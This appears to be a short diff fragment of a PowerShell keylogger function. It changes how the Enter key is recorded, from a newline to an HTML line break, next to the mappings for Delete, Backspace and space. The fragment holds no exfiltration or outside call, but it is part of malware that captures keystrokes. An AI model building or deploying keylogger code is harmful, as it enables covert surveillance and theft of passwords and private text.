@@ -211,7 +211,7 @@ function script:Keylogger
 					46 {$out = $out + "Delete"}
 					8 {$out = $out + "Backspace"}
 					32 {$out = $out + " "}
-					13 {$out = $out + "\n"}
+					13 {$out = $out + "<br />"}
 				}
 			}
 			
